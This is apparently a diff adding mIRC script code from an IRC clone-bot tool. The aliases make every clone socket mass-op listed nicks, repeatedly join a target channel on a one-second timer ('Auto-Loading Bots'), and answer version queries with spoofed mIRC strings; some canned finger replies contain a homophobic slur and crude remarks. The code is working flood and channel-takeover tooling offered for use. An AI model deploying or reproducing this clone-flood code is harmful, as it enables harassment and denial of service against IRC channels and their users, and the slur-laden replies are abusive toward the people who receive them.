+  While ($Sock(Clone.*,%I)) {
+    If ($Sock(Clone.*,%I).Mark) && ($Sock(Clone.*,%I).Mark != 1) && (!$DidWM(Clone.IPs,1,$Sock(Clone.*,%I).IP $Sock(Clone.*,%I).Port)) {
+      Did -i Clone.IPs 1 1 $Sock(Clone.*,%I).IP $Sock(Clone.*,%I).Port
+    }
+    Inc %I
+  }
+}
+alias clone.op {
+  var %x = 1
+  while ($did(Clone,38,%x) != $null) {
+    sockwrite -nt * mode $active +oooooo $did(Clone,38,%x) $did(Clone,38,$calc(%x + 1)) $did(Clone,38,$calc(%x + 2)) $did(Clone,38,$calc(%x + 3)) $did(Clone,38,$calc(%x + 4)) $did(Clone,38,$calc(%x + 5)) $did(Clone,38,$calc(%x + 6)) $did(Clone,38,$calc(%x + 7)) $did(Clone,38,$calc(%x + 8)) $did(Clone,38,$calc(%x + 9)) $did(Clone,38,$calc(%x + 10))
+    inc %x 6
+  }
+}
+Alias f {
+  /set %fuck.chan $1
+  /timerflood1 0 1 /sockwrite -nt * join %fuck.chan
+  /echo %scrinfo $timestamp ø 8,1Auto-Loading Bots to: %fuck.chan
+}
+Alias fo {
+  /timerflood* off
+  /echo -a %scrinfo $timestamp ø 8,1Stopped Auto-Loadin &
+  /unset %fuck.*
+}
+Alias VReply {
+  If ($1 == 1) { Return mIRC v7.01 Khaled Mardam-Bay }
+  If ($1 == 2) { Return mIRC v6.35 Khaled Mardam-Bay }
+  If ($1 == 3) { Return mIRC vRxBot f0rte }
+  If ($1 == 4) { Return ^=o.o=^ I'm a kitty, rawr! }
+  If ($1 == 5) { Return mIRC (>^.^)> KIRBY SAYS.  STFU }
+  If ($1 == 7) { Return mIRC v6.21 Khaled Mardam-Bey }
+  If ($1 == 8) { Return mIRC v6.31 Khaled Mardam-Bey }
+  If ($1 == 9) { Return mIRC v6.12 Khaled Mardam-Bey }
+  If ($1 == 10) { Return mIRC v6.16 Khaled Mardam-Bey }
+}
+Alias FReply {
+  If ($1 == 1) { Return Don't Finger Me Pervert! }
+  If ($1 == 2) { Return Lay Off My Koolaid! }
+  If ($1 == 3) { Return Sniff your Finger, I dare yee. }
+  If ($1 == 4) { Return I request another finger. ;) }
+  If ($1 == 5) { Return You look prettier when I'm drunk. ;) }
+  If ($1 == 6) { Return WHOA. YOU'RE INVADING MII PERSONAL SPACE, YOU TWO-BIT QUEER. WHERE I'M FROM, PEPOLE GET SHOT FOR THAT. }
+  If ($1 == 7) { Return mmm. now swirl your finger. pl0x. }
+  If ($1 == 8) { Return Sir. I don't believe you to be a doctor!@@#$#%^&& }
+  If ($1 == 9) { Return Is it my turn? ;] }
+  If ($1 == 10) { Return DaCreW. }
+}
